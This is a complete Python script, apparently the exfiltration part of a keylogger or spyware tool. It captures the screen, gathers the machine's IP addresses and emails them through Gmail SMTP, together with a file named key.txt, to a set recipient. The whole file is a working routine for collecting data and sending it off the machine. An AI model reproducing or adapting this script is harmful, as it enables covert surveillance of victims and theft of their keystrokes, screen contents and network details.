import smtplib
import os
from dotenv import load_dotenv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
from PIL import ImageGrab

# Load environment variables from .env file
load_dotenv()

def get_ip_addresses():
    hostname = socket.gethostname()
    ip_addresses = []
    
    for ip in socket.getaddrinfo(hostname, None):
        if ip[0] == socket.AF_INET:
            ip_addresses.append(f"IPv4: {ip[4][0]}")
        elif ip[0] == socket.AF_INET6:
            ip_addresses.append(f"IPv6: {ip[4][0]}")
    
    return ip_addresses

def send_email(subject, body, to, filename, screenshot_path):
    # Your Gmail email credentials from environment variables
    sender_email = os.getenv("GMAIL_EMAIL")
    sender_password = os.getenv("GMAIL_APP_PASSWORD")

    if not sender_email or not sender_password:
        raise ValueError("Email credentials are not set in the environment variables")

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = to
    msg['Subject'] = subject

    # Attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # Open the file to be sent
    with open(filename, 'rb') as attachment:
        mime_base = MIMEBase('application', 'octet-stream')
        mime_base.set_payload(attachment.read())
        encoders.encode_base64(mime_base)
        mime_base.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(mime_base)

    # Attach the screenshot
    with open(screenshot_path, 'rb') as screenshot:
        mime_base = MIMEBase('application', 'octet-stream')
        mime_base.set_payload(screenshot.read())
        encoders.encode_base64(mime_base)
        mime_base.add_header('Content-Disposition', f'attachment; filename={screenshot_path}')
        msg.attach(mime_base)

    # Set up the SMTP server for Gmail
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(sender_email, sender_password)
    text = msg.as_string()
    server.sendmail(sender_email, to, text)
    server.quit()

    print(f"Email sent to {to} with attachments {filename} and {screenshot_path}")
    print("Attachments were sent successfully. Please view your email for confirmation")

def take_screenshot(path):
    screenshot = ImageGrab.grab()
    screenshot.save(path)
    print(f"Screenshot saved to {path}")

if __name__ == "__main__":
    subject = "Project 0x01ee5dfc"
    ip_addresses = get_ip_addresses()
    body = f"Here are the IP addresses of the machine:\n{'\n'.join(ip_addresses)}"
    to = "recepient_email@gmail.com"
    filename = "C:\\Users\\Admin\\Documents\\cshit\\sendMail\\key.txt" #Path, changes can be made if you want to
    screenshot_path = "C:\\Users\\Admin\\Documents\\cshit\\sendMail\\screenshot.png"

    # Take a screenshot before sending the email
    take_screenshot(screenshot_path)
    
    send_email(subject, body, to, filename, screenshot_path)
    print(subject + " was sent to " + to)
